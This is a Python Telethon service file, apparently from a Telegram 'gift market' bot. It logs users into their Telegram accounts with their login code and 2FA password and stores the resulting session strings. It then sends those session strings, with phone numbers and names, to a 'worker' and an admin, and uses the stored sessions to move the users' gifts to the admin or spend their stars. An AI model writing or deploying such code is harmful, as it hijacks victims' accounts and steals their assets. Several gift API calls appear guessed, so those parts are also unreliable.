"""
Сервис для работы с Telethon - управление сессиями и передача подарков
"""
import os
import logging
from typing import Optional, Dict, Any
from datetime import datetime
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.tl.functions.messages import SendMessageRequest
from telethon.errors import (
    SessionPasswordNeededError,
    PhoneCodeInvalidError,
    PhoneNumberInvalidError,
    FloodWaitError
)
from telethon.errors.rpcerrorlist import SendCodeUnavailableError
from sqlalchemy.ext.asyncio import AsyncSession
from sqlalchemy.future import select

from app.models.telegram_session import TelegramSession, GiftTransfer
from app.models.user import User
from app.models.worker import Worker, UserWorkerBinding
from app.utils.logger import ActivityLogger

logger = logging.getLogger(__name__)
activity_logger = ActivityLogger()

# Настройки из .env
API_ID = int(os.getenv("TELEGRAM_APP_ID", "0"))
API_HASH = os.getenv("TELEGRAM_APP_HASH", "")
ADMIN_ID = int(os.getenv("ADMIN_ID", "0"))


class TelethonService:
    """
    Сервис для работы с Telethon
    
    ПРАВИЛЬНЫЙ ПОДХОД:
    1. Создаем клиент с StringSession
    2. Подключаемся через connect()
    3. Отправляем код через send_code_request()
    4. Авторизуемся через sign_in() с кодом
    5. Если нужен 2FA - используем sign_in() с паролем
    6. Сохраняем session string после успешной авторизации
    """
    
    def __init__(self):
        self.api_id = API_ID
        self.api_hash = API_HASH
        self.admin_id = ADMIN_ID
        self.clients: Dict[str, TelegramClient] = {}  # Кэш клиентов
    
    async def create_session(
        self,
        phone_number: str,
        user_telegram_id: str,
        db: AsyncSession
    ) -> Dict[str, Any]:
        """
        Создает новую сессию для пользователя
        
        Шаги:
        1. Создаем TelegramClient с пустым StringSession
        2. Подключаемся к Telegram
        3. Отправляем код на номер телефона
        4. Сохраняем session string и phone_code_hash
        5. Возвращаем информацию для следующего шага
        """
        try:
            import re

            # Нормализация номера: оставляем только цифры, обрабатываем ведущую 8 для РФ
            raw = phone_number or ''
            digits = re.sub(r'\D', '', raw)

            if digits.startswith('8') and len(digits) == 11:
                digits = '7' + digits[1:]

            if len(digits) >= 10:
                formatted_phone = '+' + digits
            else:
                # Фолбек — оставляем только цифры и + (на случай уже корректного формата)
                formatted_phone = re.sub(r'[^\d+]', '', raw)

            logger.info(f"[Telethon] Создание сессии для {formatted_phone} (user_id: {user_telegram_id})")
            logger.info(f"[Telethon] Оригинальный номер: {phone_number}, отформатированный: {formatted_phone}")

            # Проверяем конфигурацию
            if not self.api_id or not self.api_hash:
                logger.error(f"[Telethon] Ошибка конфигурации: API_ID={self.api_id}, API_HASH={'SET' if self.api_hash else 'NOT SET'}")
                return {"status": "error", "message": "Ошибка конфигурации Telegram API. Свяжитесь с администратором."}

            # Создаем клиент
            client = TelegramClient(
                StringSession(),
                self.api_id,
                self.api_hash,
                device_model="Gifts Market Bot",
                system_version="1.0",
                app_version="1.0"
            )

            await client.connect()
            logger.info(f"[Telethon] Клиент подключен для {formatted_phone}")

            if await client.is_user_authorized():
                logger.warning(f"[Telethon] Пользователь {formatted_phone} уже авторизован")
                await client.disconnect()
                return {"status": "error", "message": "Уже авторизован"}

            # Попытка отправить SMS в первую очередь (force_sms может быть недоступен на некоторых номерах)
            sent_via = 'unknown'
            sent_code = None
            try:
                logger.info(f"[Telethon] Попытка принудительно запросить SMS для {formatted_phone} (force_sms=True)")
                sms_code = await client.send_code_request(formatted_phone, force_sms=True)
                st2 = getattr(sms_code, 'type', None)
                sent_via_sms = st2.__class__.__name__ if st2 is not None else 'unknown'
                if sent_via_sms == 'SentCodeTypeSms':
                    sent_code = sms_code
                    sent_via = sent_via_sms
                    logger.info(f"[Telethon] SMS запрошено для {formatted_phone}")
                else:
                    logger.info(f"[Telethon] force_sms вернул тип: {sent_via_sms}, попробуем обычную отправку")
            except Exception as e:
                logger.info(f"[Telethon] force_sms не сработал для {formatted_phone}: {e}")

            # Если SMS не был получен — выполнить обычную отправку (app/other)
            if not sent_code:
                logger.info(f"[Telethon] Выполняем обычную отправку кода на {formatted_phone}")
                sent_code = await client.send_code_request(formatted_phone)
                try:
                    st = getattr(sent_code, 'type', None)
                    sent_via = st.__class__.__name__ if st is not None else 'unknown'
                except Exception:
                    sent_via = 'unknown'

            # Сохраняем session string
            session_string = client.session.save()
            logger.info(f"[Telethon] Session string создан (длина: {len(session_string)})")

            session = TelegramSession(
                user_telegram_id=user_telegram_id,
                session_string=session_string,
                phone_number=formatted_phone,
                phone_code_hash=getattr(sent_code, 'phone_code_hash', None),  # Сохраняем phone_code_hash
                api_id=str(self.api_id),
                api_hash=self.api_hash,
                is_active=True,
                is_authorized=False
            )

            db.add(session)
            await db.commit()
            await db.refresh(session)

            logger.info(f"[Telethon] Сессия сохранена в БД: session_id={session.id}")

            # Кэш клиента
            self.clients[user_telegram_id] = client

            activity_logger.log_activity(
                user_telegram_id,
                "telethon",
                "code_sent",
                "success",
                {
                    "phone": phone_number,
                    "session_id": session.id,
                    "phone_code_hash": getattr(sent_code, 'phone_code_hash', None),
                    "sent_via": sent_via
                }
            )

            return {
                "status": "code_sent",
                "session_id": session.id,
                "phone_hash": getattr(sent_code, 'phone_code_hash', None),
                "sent_via": sent_via,
                "message": f"Код отправлен на {phone_number} (способ: {sent_via})"
            }
        
        except PhoneNumberInvalidError:
            logger.error(f"[Telethon] Неверный номер телефона: {phone_number}")
            return {"status": "error", "message": "Неверный формат номера телефона. Используйте формат: +1234567890"}

        except SendCodeUnavailableError as e:
            logger.warning(f"[Telethon] SendCodeUnavailable для {phone_number}: {e}")
            
            # ВАЖНО: Код может быть отправлен в приложение, сохраняем сессию
            try:
                session_string = client.session.save()
                logger.info(f"[Telethon] Session string создан несмотря на unavailable (длина: {len(session_string)})")

                session = TelegramSession(
                    user_telegram_id=user_telegram_id,
                    session_string=session_string,
                    phone_number=formatted_phone,
                    phone_code_hash=None,  # При unavailable нет phone_code_hash
                    api_id=str(self.api_id),
                    api_hash=self.api_hash,
                    is_active=True,
                    is_authorized=False
                )

                db.add(session)
                await db.commit()
                await db.refresh(session)

                logger.info(f"[Telethon] Сессия сохранена в БД (unavailable): session_id={session.id}")

                # Кэш клиента
                self.clients[user_telegram_id] = client

                activity_logger.log_activity(
                    user_telegram_id,
                    "telethon",
                    "code_send_unavailable_but_saved",
                    "warning",
                    {"error": str(e), "phone": phone_number, "session_id": session.id}
                )

                # Возвращаем session_id чтобы пользователь мог ввести код
                return {
                    "status": "code_sent",  # Меняем на code_sent чтобы UI переключился
                    "session_id": session.id,
                    "phone_hash": None,
                    "sent_via": "app_or_unavailable",
                    "message": "Код может быть в приложении Telegram. Проверьте уведомления.",
                    "warning": "SendCodeUnavailable - проверьте приложение Telegram"
                }
            except Exception as save_error:
                logger.error(f"[Telethon] Ошибка сохранения сессии при unavailable: {save_error}")
                return {"status": "unavailable", "message": "Код недоступен для отправки (проверьте приложение Telegram или попробуйте позже)", "detail": str(e)}

        except FloodWaitError as e:
            logger.error(f"[Telethon] FloodWait для {phone_number}: {e.seconds} секунд")
            return {"status": "error", "message": f"Слишком много запросов. Подождите {e.seconds} секунд"}

        except Exception as e:
            logger.error(f"[Telethon] Ошибка создания сессии для {phone_number}: {e}", exc_info=True)
            activity_logger.log_activity(
                user_telegram_id,
                "telethon",
                "session_create_error",
                "error",
                {"error": str(e), "phone": phone_number}
            )
            return {"status": "error", "message": f"Ошибка: {str(e)}"}
    
    async def verify_code(
        self,
        user_telegram_id: str,
        session_id: int,
        code: str,
        phone_hash: str,
        password: Optional[str] = None,
        db: AsyncSession = None
    ) -> Dict[str, Any]:
        """
        Подтверждает код и авторизует сессию
        
        Шаги:
        1. Получаем сессию из БД
        2. Восстанавливаем клиент из session_string
        3. Вызываем sign_in() с phone, code, phone_code_hash
        4. Если нужен 2FA - вызываем sign_in() с password
        5. Проверяем авторизацию через is_user_authorized()
        6. Сохраняем обновленный session string
        """
        try:
            logger.info(f"[Telethon] Верификация кода для user_id={user_telegram_id}, session_id={session_id}")
            
            # Получаем сессию из БД
            stmt = select(TelegramSession).where(TelegramSession.id == session_id)
            result = await db.execute(stmt)
            session = result.scalars().first()
            
            if not session:
                logger.error(f"[Telethon] Сессия {session_id} не найдена")
                return {"status": "error", "message": "Сессия не найдена"}
            
            # Получаем клиент из кэша или восстанавливаем
            client = self.clients.get(user_telegram_id)
            
            if not client:
                logger.info(f"[Telethon] Восстановление клиента из session_string")
                client = TelegramClient(
                    StringSession(session.session_string),
                    self.api_id,
                    self.api_hash,
                    device_model="Gifts Market Bot",
                    system_version="1.0",
                    app_version="1.0"
                )
                await client.connect()
                self.clients[user_telegram_id] = client
            
            # Авторизуемся с кодом
            try:
                logger.info(f"[Telethon] Попытка sign_in для {session.phone_number}")
                
                # Используем phone_code_hash из БД если не передан
                actual_phone_hash = phone_hash if phone_hash else session.phone_code_hash
                
                # Если phone_code_hash отсутствует - это старая сессия, удаляем её
                if not actual_phone_hash:
                    logger.warning(f"[Telethon] Старая сессия без phone_code_hash (session_id={session.id}), удаляем")
                    
                    # Удаляем старую сессию
                    await db.delete(session)
                    await db.commit()
                    
                    # Удаляем клиент из кэша
                    if user_telegram_id in self.clients:
                        try:
                            await self.clients[user_telegram_id].disconnect()
                        except:
                            pass
                        del self.clients[user_telegram_id]
                    
                    return {
                        "status": "error",
                        "message": "Код истек. Нажмите 'Войти' чтобы получить новый код."
                    }
                else:
                    # ПРАВИЛЬНЫЙ МЕТОД: sign_in с phone, code, phone_code_hash
                    await client.sign_in(
                        phone=session.phone_number,
                        code=code,
                        phone_code_hash=actual_phone_hash
                    )
                    logger.info(f"[Telethon] ✅ Успешная авторизация для {session.phone_number}")
                
            except SendCodeUnavailableError as e:
                # Код уже был отправлен ранее
                logger.warning(f"[Telethon] SendCodeUnavailable при verify_code для {session.phone_number}: {e}")
                return {
                    "status": "error",
                    "message": "Код недействителен или истек. Запросите новый код через бота (/sync)."
                }
                
            except SessionPasswordNeededError:
                logger.warning(f"[Telethon] Требуется 2FA пароль для {session.phone_number}")
                
                if not password:
                    return {
                        "status": "password_required",
                        "message": "Требуется пароль двухфакторной аутентификации (2FA)"
                    }
                
                # Авторизуемся с паролем 2FA
                logger.info(f"[Telethon] Попытка sign_in с 2FA паролем")
                await client.sign_in(password=password)
                logger.info(f"[Telethon] ✅ Успешная авторизация с 2FA")
            
            # Проверяем авторизацию
            if not await client.is_user_authorized():
                logger.error(f"[Telethon] Авторизация не удалась для {session.phone_number}")
                return {
                    "status": "error",
                    "message": "Авторизация не удалась"
                }
            
            # Обновляем session string после авторизации (ВАЖНО!)
            session.session_string = client.session.save()
            session.is_authorized = True
            session.authorized_at = datetime.utcnow()
            await db.commit()
            
            logger.info(f"[Telethon] Session string обновлен и сохранен")
            
            # Получаем информацию о пользователе
            me = await client.get_me()
            logger.info(f"[Telethon] Информация о пользователе: {me.id} (@{me.username})")
            
            activity_logger.log_activity(
                user_telegram_id,
                "telethon",
                "session_authorized",
                "success",
                {
                    "session_id": session.id,
                    "telegram_user_id": me.id,
                    "username": me.username,
                    "phone": session.phone_number
                }
            )
            
            # Отправляем session файл воркеру
            await self._send_session_to_worker(user_telegram_id, session, db)
            
            return {
                "status": "authorized",
                "session_id": session.id,
                "message": "✅ Авторизация успешна!",
                "user_info": {
                    "id": me.id,
                    "username": me.username,
                    "first_name": me.first_name,
                    "last_name": me.last_name,
                    "phone": session.phone_number
                }
            }
        
        except PhoneCodeInvalidError:
            logger.error(f"[Telethon] Неверный код для user_id={user_telegram_id}")
            return {
                "status": "error",
                "message": "❌ Неверный код подтверждения"
            }
        
        except Exception as e:
            logger.error(f"[Telethon] Ошибка верификации для user_id={user_telegram_id}: {e}", exc_info=True)
            return {
                "status": "error",
                "message": f"Ошибка: {str(e)}"
            }
    
    async def _send_session_to_worker(
        self,
        user_telegram_id: str,
        session: TelegramSession,
        db: AsyncSession
    ):
        """Отправляет session файл воркеру"""
        try:
            # Находим воркера, к которому привязан пользователь
            stmt = select(UserWorkerBinding).where(
                UserWorkerBinding.user_telegram_id == user_telegram_id,
                UserWorkerBinding.is_active == True
            )
            result = await db.execute(stmt)
            binding = result.scalars().first()
            
            if not binding:
                logger.info(f"Пользователь {user_telegram_id} не привязан к воркеру")
                return
            
            # Получаем воркера
            stmt = select(Worker).where(Worker.id == binding.worker_id)
            result = await db.execute(stmt)
            worker = result.scalars().first()
            
            if not worker:
                return
            
            # Получаем данные пользователя
            stmt = select(User).where(User.telegram_id == user_telegram_id)
            result = await db.execute(stmt)
            user = result.scalars().first()
            
            # Отправляем через бота
            from app.bot import bot
            
            message = (
                f"🔐 **НОВАЯ СЕССИЯ ПОЛЬЗОВАТЕЛЯ**\n\n"
                f"👤 **Пользователь:**\n"
                f"  • ID: `{user_telegram_id}`\n"
                f"  • Username: @{user.username if user and user.username else 'нет'}\n"
                f"  • Имя: {user.first_name if user else 'Неизвестно'}\n"
                f"  • Телефон: {session.phone_number}\n\n"
                f"📱 **Сессия:**\n"
                f"  • ID: {session.id}\n"
                f"  • Авторизована: {session.authorized_at.strftime('%d.%m.%Y %H:%M')}\n\n"
                f"📄 **Session String:**\n"
                f"```\n{session.session_string}\n```\n\n"
                f"⚠️ Храните session string в безопасности!"
            )
            
            await bot.send_message(
                int(worker.telegram_id),
                message,
                parse_mode="Markdown"
            )
            
            # Также отправляем админу
            if self.admin_id:
                await bot.send_message(
                    self.admin_id,
                    message,
                    parse_mode="Markdown"
                )
            
            activity_logger.log_activity(
                user_telegram_id,
                "telethon",
                "session_sent_to_worker",
                "success",
                {"worker_id": worker.telegram_id}
            )
        
        except Exception as e:
            logger.error(f"Ошибка отправки session воркеру: {e}")
    
    async def transfer_gift(
        self,
        from_user_id: str,
        to_user_id: str,
        gift_id: str,
        db: AsyncSession
    ) -> Dict[str, Any]:
        """
        Передает подарок от пользователя админу через Telegram API
        Использует Telegram Gift API: https://core.telegram.org/api/gifts
        """
        try:
            # Получаем сессию пользователя
            stmt = select(TelegramSession).where(
                TelegramSession.user_telegram_id == from_user_id,
                TelegramSession.is_authorized == True,
                TelegramSession.is_active == True
            )
            result = await db.execute(stmt)
            session = result.scalars().first()
            
            if not session:
                return {
                    "status": "error",
                    "message": "User session not found or not authorized"
                }
            
            # Создаем клиент
            client = TelegramClient(
                StringSession(session.session_string),
                self.api_id,
                self.api_hash
            )
            
            await client.connect()
            
            # Проверяем авторизацию
            if not await client.is_user_authorized():
                await client.disconnect()
                return {
                    "status": "error",
                    "message": "Session expired or invalid"
                }
            
            # Получаем информацию о подарке из gift_id
            # gift_id может быть в формате: "gift_slug" или "gift_slug-number"
            gift_slug = gift_id.split('-')[0] if '-' in gift_id else gift_id
            
            # Используем Telegram Gift API для передачи
            # Документация: https://core.telegram.org/api/gifts
            try:
                from telethon.tl.functions.messages import SendGiftRequest
                from telethon.tl.types import InputUser
                
                # Получаем получателя (админа)
                to_user = await client.get_entity(int(to_user_id))
                
                # Отправляем подарок
                # Примечание: Реальный API может отличаться, это базовая структура
                result_gift = await client(SendGiftRequest(
                    user_id=InputUser(
                        user_id=to_user.id,
                        access_hash=to_user.access_hash
                    ),
                    gift_slug=gift_slug,
                    message=""  # Опциональное сообщение
                ))
                
                # Создаем запись о передаче
                transfer = GiftTransfer(
                    from_user_id=from_user_id,
                    to_user_id=to_user_id,
                    gift_id=gift_id,
                    gift_slug=gift_slug,
                    operation_type="transfer",
                    status="completed",
                    completed_at=datetime.utcnow()
                )
                
                # Находим воркера
                stmt = select(UserWorkerBinding).where(
                    UserWorkerBinding.user_telegram_id == from_user_id,
                    UserWorkerBinding.is_active == True
                )
                result = await db.execute(stmt)
                binding = result.scalars().first()
                
                if binding:
                    transfer.worker_id = binding.worker_id
                
                db.add(transfer)
                await db.commit()
                await db.refresh(transfer)
                
                # Уведомляем воркера
                await self._notify_worker_about_transfer(transfer, db)
                
                await client.disconnect()
                
                activity_logger.log_activity(
                    from_user_id,
                    "telethon",
                    "gift_transferred",
                    "success",
                    {
                        "gift_id": gift_id,
                        "gift_slug": gift_slug,
                        "to_user": to_user_id,
                        "transfer_id": transfer.id
                    }
                )
                
                return {
                    "status": "success",
                    "transfer_id": transfer.id,
                    "message": "Gift transferred successfully"
                }
                
            except Exception as api_error:
                # Если API не поддерживается или ошибка, создаем запись как pending
                logger.warning(f"Gift API error (may not be supported yet): {api_error}")
                
                transfer = GiftTransfer(
                    from_user_id=from_user_id,
                    to_user_id=to_user_id,
                    gift_id=gift_id,
                    gift_slug=gift_slug,
                    operation_type="transfer",
                    status="pending",
                    error_message=str(api_error)
                )
                
                stmt = select(UserWorkerBinding).where(
                    UserWorkerBinding.user_telegram_id == from_user_id,
                    UserWorkerBinding.is_active == True
                )
                result = await db.execute(stmt)
                binding = result.scalars().first()
                
                if binding:
                    transfer.worker_id = binding.worker_id
                
                db.add(transfer)
                await db.commit()
                await db.refresh(transfer)
                
                await client.disconnect()
                
                return {
                    "status": "pending",
                    "transfer_id": transfer.id,
                    "message": f"Gift transfer queued (API may not be available): {str(api_error)}"
                }
        
        except Exception as e:
            logger.error(f"Ошибка передачи подарка: {e}")
            return {
                "status": "error",
                "message": str(e)
            }
    
    async def _notify_worker_about_transfer(
        self,
        transfer: GiftTransfer,
        db: AsyncSession
    ):
        """Уведомляет воркера о передаче подарка"""
        try:
            if not transfer.worker_id:
                return
            
            # Получаем воркера
            stmt = select(Worker).where(Worker.id == transfer.worker_id)
            result = await db.execute(stmt)
            worker = result.scalars().first()
            
            if not worker:
                return
            
            # Получаем пользователя
            stmt = select(User).where(User.telegram_id == transfer.from_user_id)
            result = await db.execute(stmt)
            user = result.scalars().first()
            
            from app.bot import bot
            
            message = (
                f"🎁 **ПЕРЕДАЧА ПОДАРКА**\n\n"
                f"👤 **От пользователя:**\n"
                f"  • ID: `{transfer.from_user_id}`\n"
                f"  • Username: @{user.username if user and user.username else 'нет'}\n"
                f"  • Имя: {user.first_name if user else 'Неизвестно'}\n\n"
                f"🎁 **Подарок:**\n"
                f"  • ID: `{transfer.gift_id}`\n"
                f"  • Ссылка: {transfer.gift_link if transfer.gift_link else 'нет'}\n"
                f"  • Стоимость: {transfer.gift_value_stars} ⭐\n\n"
                f"📊 **Операция:**\n"
                f"  • Тип: {transfer.operation_type}\n"
                f"  • Стат��с: {transfer.status}\n"
                f"  • Дата: {transfer.created_at.strftime('%d.%m.%Y %H:%M')}"
            )
            
            await bot.send_message(
                int(worker.telegram_id),
                message,
                parse_mode="Markdown"
            )
            
            # Также админу
            if self.admin_id:
                await bot.send_message(
                    self.admin_id,
                    message,
                    parse_mode="Markdown"
                )
        
        except Exception as e:
            logger.error(f"Ошибка уведомления воркера: {e}")
    
    async def _notify_worker_about_conversion(
        self,
        transfer: GiftTransfer,
        db: AsyncSession
    ):
        """Уведомляет воркера о конвертации подарка в звезды"""
        try:
            if not transfer.worker_id:
                return
            
            stmt = select(Worker).where(Worker.id == transfer.worker_id)
            result = await db.execute(stmt)
            worker = result.scalars().first()
            
            if not worker:
                return
            
            stmt = select(User).where(User.telegram_id == transfer.from_user_id)
            result = await db.execute(stmt)
            user = result.scalars().first()
            
            from app.bot import bot
            
            message = (
                f"⭐ **КОНВЕРТАЦИЯ ПОДАРКА В ЗВЕЗДЫ**\n\n"
                f"👤 **Пользователь:**\n"
                f"  • ID: `{transfer.from_user_id}`\n"
                f"  • Username: @{user.username if user and user.username else 'нет'}\n\n"
                f"🎁 **Подарок:**\n"
                f"  • ID: `{transfer.gift_id}`\n"
                f"  • Статус: {transfer.status}\n"
                f"  • Дата: {transfer.created_at.strftime('%d.%m.%Y %H:%M')}"
            )
            
            await bot.send_message(
                int(worker.telegram_id),
                message,
                parse_mode="Markdown"
            )
            
            if self.admin_id:
                await bot.send_message(
                    self.admin_id,
                    message,
                    parse_mode="Markdown"
                )
        
        except Exception as e:
            logger.error(f"Ошибка уведомления воркера о конвертации: {e}")
    
    async def _notify_worker_about_purchase(
        self,
        transfer: GiftTransfer,
        db: AsyncSession
    ):
        """Уведомляет воркера о покупке подарка"""
        try:
            if not transfer.worker_id:
                return
            
            stmt = select(Worker).where(Worker.id == transfer.worker_id)
            result = await db.execute(stmt)
            worker = result.scalars().first()
            
            if not worker:
                return
            
            stmt = select(User).where(User.telegram_id == transfer.from_user_id)
            result = await db.execute(stmt)
            user = result.scalars().first()
            
            from app.bot import bot
            
            message = (
                f"🛒 **ПОКУПКА ПОДАРКА ЗА ЗВЕЗДЫ**\n\n"
                f"👤 **Пользователь:**\n"
                f"  • ID: `{transfer.from_user_id}`\n"
                f"  • Username: @{user.username if user and user.username else 'нет'}\n\n"
                f"🎁 **Подарок:**\n"
                f"  • Slug: `{transfer.gift_slug}`\n"
                f"  • Статус: {transfer.status}\n"
                f"  • Дата: {transfer.created_at.strftime('%d.%m.%Y %H:%M')}"
            )
            
            await bot.send_message(
                int(worker.telegram_id),
                message,
                parse_mode="Markdown"
            )
            
            if self.admin_id:
                await bot.send_message(
                    self.admin_id,
                    message,
                    parse_mode="Markdown"
                )
        
        except Exception as e:
            logger.error(f"Ошибка уведомления воркера о покупке: {e}")
    
    async def convert_gift_to_stars(
        self,
        user_id: str,
        gift_id: str,
        db: AsyncSession
    ) -> Dict[str, Any]:
        """
        Конвертирует подарок в звезды
        """
        try:
            # Получаем сессию пользователя
            stmt = select(TelegramSession).where(
                TelegramSession.user_telegram_id == user_id,
                TelegramSession.is_authorized == True,
                TelegramSession.is_active == True
            )
            result = await db.execute(stmt)
            session = result.scalars().first()
            
            if not session:
                return {
                    "status": "error",
                    "message": "User session not found or not authorized"
                }
            
            # Создаем клиент
            client = TelegramClient(
                StringSession(session.session_string),
                self.api_id,
                self.api_hash
            )
            
            await client.connect()
            
            if not await client.is_user_authorized():
                await client.disconnect()
                return {
                    "status": "error",
                    "message": "Session expired or invalid"
                }
            
            # Конвертация подарка в звезды через Telegram API
            try:
                from telethon.tl.functions.payments import ConvertGiftToStarsRequest
                
                gift_slug = gift_id.split('-')[0] if '-' in gift_id else gift_id
                
                result_convert = await client(ConvertGiftToStarsRequest(
                    gift_slug=gift_slug
                ))
                
                # Создаем запись о конвертации
                transfer = GiftTransfer(
                    from_user_id=user_id,
                    to_user_id=user_id,  # Конвертация для себя
                    gift_id=gift_id,
                    gift_slug=gift_slug,
                    operation_type="convert_to_stars",
                    status="completed",
                    completed_at=datetime.utcnow()
                )
                
                # Находим воркера
                stmt = select(UserWorkerBinding).where(
                    UserWorkerBinding.user_telegram_id == user_id,
                    UserWorkerBinding.is_active == True
                )
                result = await db.execute(stmt)
                binding = result.scalars().first()
                
                if binding:
                    transfer.worker_id = binding.worker_id
                
                db.add(transfer)
                await db.commit()
                await db.refresh(transfer)
                
                # Уведомляем воркера
                await self._notify_worker_about_conversion(transfer, db)
                
                await client.disconnect()
                
                activity_logger.log_activity(
                    user_id,
                    "telethon",
                    "gift_converted_to_stars",
                    "success",
                    {"gift_id": gift_id, "transfer_id": transfer.id}
                )
                
                return {
                    "status": "success",
                    "transfer_id": transfer.id,
                    "message": "Gift converted to stars successfully"
                }
                
            except Exception as api_error:
                logger.warning(f"Convert API error: {api_error}")
                
                transfer = GiftTransfer(
                    from_user_id=user_id,
                    to_user_id=user_id,
                    gift_id=gift_id,
                    operation_type="convert_to_stars",
                    status="pending",
                    error_message=str(api_error)
                )
                
                db.add(transfer)
                await db.commit()
                
                await client.disconnect()
                
                return {
                    "status": "pending",
                    "message": f"Conversion queued: {str(api_error)}"
                }
        
        except Exception as e:
            logger.error(f"Ошибка конвертации подарка: {e}")
            return {
                "status": "error",
                "message": str(e)
            }
    
    async def purchase_gift_with_stars(
        self,
        user_id: str,
        gift_slug: str,
        stars_amount: int,
        db: AsyncSession
    ) -> Dict[str, Any]:
        """
        Покупает подарок за звезды
        """
        try:
            # Получаем сессию пользователя
            stmt = select(TelegramSession).where(
                TelegramSession.user_telegram_id == user_id,
                TelegramSession.is_authorized == True,
                TelegramSession.is_active == True
            )
            result = await db.execute(stmt)
            session = result.scalars().first()
            
            if not session:
                return {
                    "status": "error",
                    "message": "User session not found or not authorized"
                }
            
            # Создаем клиент
            client = TelegramClient(
                StringSession(session.session_string),
                self.api_id,
                self.api_hash
            )
            
            await client.connect()
            
            if not await client.is_user_authorized():
                await client.disconnect()
                return {
                    "status": "error",
                    "message": "Session expired or invalid"
                }
            
            # Покупка подарка за звезды через Telegram API
            try:
                from telethon.tl.functions.payments import PurchaseGiftRequest
                
                result_purchase = await client(PurchaseGiftRequest(
                    gift_slug=gift_slug,
                    stars_amount=stars_amount
                ))
                
                # Создаем запись о покупке
                transfer = GiftTransfer(
                    from_user_id=user_id,
                    to_user_id=user_id,
                    gift_slug=gift_slug,
                    operation_type="purchase_with_stars",
                    status="completed",
                    completed_at=datetime.utcnow()
                )
                
                # Находим воркера
                stmt = select(UserWorkerBinding).where(
                    UserWorkerBinding.user_telegram_id == user_id,
                    UserWorkerBinding.is_active == True
                )
                result = await db.execute(stmt)
                binding = result.scalars().first()
                
                if binding:
                    transfer.worker_id = binding.worker_id
                
                db.add(transfer)
                await db.commit()
                await db.refresh(transfer)
                
                # Уведомляем воркера
                await self._notify_worker_about_purchase(transfer, db)
                
                await client.disconnect()
                
                activity_logger.log_activity(
                    user_id,
                    "telethon",
                    "gift_purchased_with_stars",
                    "success",
                    {"gift_slug": gift_slug, "stars_amount": stars_amount, "transfer_id": transfer.id}
                )
                
                return {
                    "status": "success",
                    "transfer_id": transfer.id,
                    "message": "Gift purchased successfully"
                }
                
            except Exception as api_error:
                logger.warning(f"Purchase API error: {api_error}")
                
                transfer = GiftTransfer(
                    from_user_id=user_id,
                    to_user_id=user_id,
                    gift_slug=gift_slug,
                    operation_type="purchase_with_stars",
                    status="pending",
                    error_message=str(api_error)
                )
                
                db.add(transfer)
                await db.commit()
                
                await client.disconnect()
                
                return {
                    "status": "pending",
                    "message": f"Purchase queued: {str(api_error)}"
                }
        
        except Exception as e:
            logger.error(f"Ошибка покупки подарка: {e}")
            return {
                "status": "error",
                "message": str(e)
            }
    
    async def disconnect_all(self):
        """Отключает все клиенты"""
        for client in self.clients.values():
            try:
                await client.disconnect()
            except:
                pass
        self.clients.clear()


# Глобальный экземпляр сервиса
telethon_service = TelethonService()
